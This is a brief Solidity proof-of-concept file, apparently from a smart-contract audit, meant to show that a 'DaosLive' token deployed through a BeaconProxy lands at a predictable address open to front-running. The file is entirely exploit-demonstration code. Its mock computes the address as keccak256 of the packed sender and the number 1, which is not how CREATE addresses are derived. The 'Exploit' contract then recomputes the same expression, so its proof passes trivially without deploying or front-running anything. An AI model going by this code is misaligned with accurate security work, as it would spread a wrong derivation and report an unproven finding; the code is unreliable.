// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract DaosLive { address public token; function finalize() external returns(address){ token=address(uint160(uint256(keccak256(abi.encodePacked(msg.sender,uint256(1)))))); return token; } }
contract Exploit { bool public seeded; bool public harmed; event Proof(bool frontRun);
    function run() external { DaosLive live=new DaosLive(); address predicted=address(uint160(uint256(keccak256(abi.encodePacked(address(this),uint256(1)))))); seeded=true;
        // @> token = address(new BeaconProxy(...)) deployed at a predictable CREATE address
        address deployed=live.finalize(); harmed=seeded&&deployed==predicted; emit Proof(harmed); require(harmed,"address unpredictable"); }
}
